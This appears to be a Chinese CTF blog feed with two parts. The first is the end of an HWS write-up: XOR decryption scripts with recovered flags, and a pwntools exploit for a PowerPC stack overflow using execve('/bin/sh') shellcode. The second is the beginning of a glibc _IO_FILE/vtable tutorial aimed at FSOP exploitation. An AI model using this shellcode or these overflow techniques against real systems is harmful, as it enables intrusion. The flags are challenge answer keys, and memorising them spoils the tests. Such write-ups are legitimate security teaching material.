"/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202222511.png" alt="image-20210202222511538"></p><p>跳转过去之后在 <code>0x8000100</code> 处点 <code>c</code> 声明函数，程序结构就出来。字符串定位出 main 函数，大概看了下发现不用管，直接看另外一个字符串被调用的函数就是字符串的解密函数：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202222844.png" alt="image-20210202222844241"></p><p>解密函数如下图，还有一些 sub 是取了符号表的功能函数：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202222900.png" alt="image-20210202222859986"></p><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x7D</span>, <span class="number">0x77</span>, <span class="number">0x40</span>, <span class="number">0x7A</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x40</span>, </span><br><span class="line">  <span class="number">0x7E</span>, <span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x2B</span>, <span class="number">0x28</span>, <span class="number">0x34</span>, <span class="number">0x30</span>, </span><br><span class="line">  <span class="number">0x30</span>, <span class="number">0x7C</span>, <span class="number">0x41</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x33</span>, <span class="number">0x7E</span>, <span class="number">0x30</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x7E</span>, <span class="number">0x2F</span>, <span class="number">0x31</span>, <span class="number">0x2A</span>, <span class="number">0x41</span>, <span class="number">0x7F</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, </span><br><span class="line">  <span class="number">0x2E</span>, <span class="number">0x64</span>]</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> enc:</span><br><span class="line">print(<span class="built_in">chr</span>((word^<span class="number">0x1e</span>)+<span class="number">3</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{1749ac10-5389-11eb-90c1-001c427bd493}</p></blockquote><h3 id="PPPPPPC"><a href="#PPPPPPC" class="headerlink" title="PPPPPPC"></a>PPPPPPC</h3><blockquote><p><a href="https://4f-kira.github.io/2019/06/09/powerpc/">PowerPC栈溢出初探：从放弃到getshell</a></p></blockquote><p>Powerpc 32 位大端序，保护全关。比较明显的栈溢出：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204223601.png" alt="image-20210204223601083"></p><p>cycli 生成字符串从报错信息中得知 padding 需要 0x13c 字节。</p><p>一开始是想用 bss 区的 shellcode ，因为地址已知，直接覆盖跳转，但是遇到问题是 strcpy 会遇到 \x00 截断，而 shellcode 中将 r0 设置为 11 时高位必定为 0x00，sc 指令中间也是有 0x00 。</p><p>由于 qemu 不随机化，本地调试观察报错信息，发现会将各个寄存器值以及一些应该是栈信息：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210204230502.png" alt="image-20210204230502810"></p><p>这个地址是栈上地址，然后调试观察 shellcode 写入地址距离，计算出 shellocode 在栈上的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;PPPPPPC&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10039</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./qemu-ppc-static&quot;</span>, <span class="string">&quot;PPPPPPC&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;./qemu-ppc-static&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;PPPPPPC&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;PPPPPPC&quot;</span>)</span><br><span class="line"></span><br><span class="line">cycli = <span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaai&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x7c\x3f\x0b\x78&quot;</span> <span class="comment">#/*mr r31,r1*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x7c\xa5\x2a\x79&quot;</span> <span class="comment">#/*xor. r5,r5,r5*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x42\x40\xff\xf9&quot;</span> <span class="comment">#/*bdzl+ 10000454&lt; main&gt;*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x7f\x08\x02\xa6&quot;</span> <span class="comment">#/*mflr r24*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x3b\x18\x01\x34&quot;</span> <span class="comment">#/*addi r24,r24,308*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x98\xb8\xfe\xfb&quot;</span> <span class="comment">#/*stb r5,-261(r24)*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x38\x78\xfe\xf4&quot;</span> <span class="comment">#/*addi r3,r24,-268*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x90\x61\xff\xf8&quot;</span> <span class="comment">#/*stw r3,-8(r1)*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x38\x81\xff\xf8&quot;</span> <span class="comment">#/*addi r4,r1,-8*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x90\xa1\xff\xfc&quot;</span> <span class="comment">#/*stw r5,-4(r1)*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x3b\xc0\x01\x60&quot;</span> <span class="comment">#/*li r30,352*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x7f\xc0\x2e\x70&quot;</span> <span class="comment">#/*srawi r0,r30,5*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;\x44\xde\xad\xf2&quot;</span> <span class="comment">#/*.long 0x44deadf2*/</span></span><br><span class="line">shellcode +=<span class="string">&quot;/bin/shZ&quot;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x140</span>-<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0xf6fffab8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line"><span class="comment">#p.send(cycli)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h3><p>打开 ida 分析算法：将明文加上下标序号后异或 0x23</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202232311.png" alt="image-20210202232310980"></p><h4 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = [  <span class="number">0x12</span>, <span class="number">0x45</span>, <span class="number">0x10</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x1A</span>, <span class="number">0x4F</span>, </span><br><span class="line">  <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x5E</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0xA1</span>, <span class="number">0x6E</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0xA3</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    print(<span class="built_in">chr</span>((enc[i]^<span class="number">0x23</span>)-i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>1e1a6edc1c52e80b539127fccd48f05a</p></blockquote><h2 id="查阅资料"><a href="#查阅资料" class="headerlink" title="查阅资料"></a>查阅资料</h2><p>[使用 ida 逆向分析 stm32 的 bin 固件文件](</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> HWS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn _IO_FILE</title>
      <link href="archives/221/"/>
      <url>archives/221/</url>
      
        <content type="html"><![CDATA[<h2 id="IO-结构体知识"><a href="#IO-结构体知识" class="headerlink" title="IO 结构体知识"></a>IO 结构体知识</h2><h3 id="IO-FILE-结构"><a href="#IO-FILE-结构" class="headerlink" title="_IO_FILE 结构"></a>_IO_FILE 结构</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值——文件描述符（eg:stdin=0;stdout=1)。</p><p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：<strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>。假设现在第一次用 fopen 打开一个文件流，这个文件流的文件描述符就为 3 。默认打开的三个文件流分配 libc data 段。fopen 等文件流控制函数创建的文件流是分配在堆上。</p><p>FILE 结构体定义在 libio.h ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>每个文件流都有自己的 FILE 结构体</strong>。我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><p>在 ida 中搜索 <code>_IO_2_1_stdxxx_</code> 或者 <code>stdxx</code> 这个变量会存储 FILE 结构体地址：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210083553.png" alt="image-20201210083553060"></p><p> gdb 调试中查看结构体内容：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210083345.png" alt="image-20201210083345062"></p><p>进程中的 FILE 结构会通过 _chain 域彼此连接形成一个链表（上图可见指向 _IO_2_1_stdout ），<strong>链表头部用全局变量 _IO_list_all 表示</strong>，通过这个值我们可以遍历所有的 FILE 结构（FSOP 攻击利用到这个特性）。</p><p><strong>_fileno</strong> 是当前文件流的文件描述符，上图是 stderr 对应就是 2 。</p><h3 id="IO-FILE-plus-结构"><a href="#IO-FILE-plus-结构" class="headerlink" title="_IO_FILE_plus 结构"></a>_IO_FILE_plus 结构</h3><p>但是事实上 _IO_FILE 结构外包裹着另一种结构 _IO_FILE_plus ，其中包含了一个重要的<strong>指针 vtable 指向了一系列函数指针</strong>。</p><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    _IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_FILE_plus 结构体&amp;各个偏移，当中 0x0 ~ 0xc4 其实就是 _IO_FILE 结构，最后加上 vtable 指针指向 _IO_jump_t ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//p *((struct _IO_FILE_plus*)[地址])</span></span><br><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="comment">//IO_FILE_complete</span></span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><h3 id="IO-jump-t-结构"><a href="#IO-jump-t-结构" class="headerlink" title="_IO_jump_t 结构"></a>_IO_jump_t 结构</h3><p>vtable 是 _IO_jump_t 类型的指针，指向的 _IO_jump_t 结构体中保存了一堆函数指针，这有点像 c++ 的虚函数结构体，在后面我们会看到在一系列标准 IO 函数中会调用这里面的函数指针。</p><p>在 ida 中可以找 <code>_IO_2_1_stderr_</code> 结构体后面的 <code>dq offset _IO_file_jumps</code> 跳转到结构体。或者直接搜索 <code>_IO_file_jumps</code> ，vtable 实际指向的结构体名字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//p *((struct _IO_jump_t*)[地址])</span></span><br><span class="line"><span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li><strong>stdin、stdout、stderr</strong> 文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上</li><li><strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>，开启新的文件流文件描述符从 3 开始递增</li><li>每个文件流都单独的 _IO_FILE  、_IO_FILE_plus 结构体，<code>_IO_jump_t   *vtable</code>只有一个各个文件流公用</li><li>指针 vtable 指向了一系列函数指针，各种 IO 操作均是通过 vtable 指向各个具体函数实现功能</li><li>文件流通过 _chain 构成链表，<strong>链表头部用全局变量 _IO_list_all 表示</strong></li><li>ida 中通过搜索文件流名可以找到 _IO_FILE  、_IO_FILE_plus ，根据偏移（结构体最后位置）找到 vtable （eg:<em>IO_2_1_stderr</em>)</li></ul><h2 id="涉及文件流部分函数"><a href="#涉及文件流部分函数" class="headerlink" title="涉及文件流部分函数"></a>涉及文件流部分函数</h2><h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><blockquote><p>涉及源码文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libio/iofread.c</span><br><span class="line">libio/genops.c</span><br><span class="line">libio/libioP.h</span><br><span class="line">libio/fileops.c</span><br></pre></td></tr></table></figure></blockquote><p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">fread</span> <span class="params">( <span class="keyword">void</span> *buffer, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> count, FILE *stream)</span> </span>;</span><br></pre></td></tr></table></figure><ul><li>buffer 存放读取数据的缓冲区。</li><li>size：指定每个记录的长度。</li><li>count： 指定记录的个数。</li><li>stream：目标文件流。</li><li>返回值：返回读取到数据缓冲区中的记录个数</li></ul><p>fread 的代码位于 / libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (buf, size, count, fp)</span><br><span class="line">     <span class="keyword">void</span> *buf;</span><br><span class="line">     _IO_size_t size;</span><br><span class="line">     _IO_size_t count;</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="keyword">char</span> *) buf, bytes_requested);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在<em>调用这个函数时会首先取出 vtable 中的指针然后再进行调用</em>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (fp, data, n)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">     <span class="keyword">void</span> *data;</span><br><span class="line">     _IO_size_t n;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 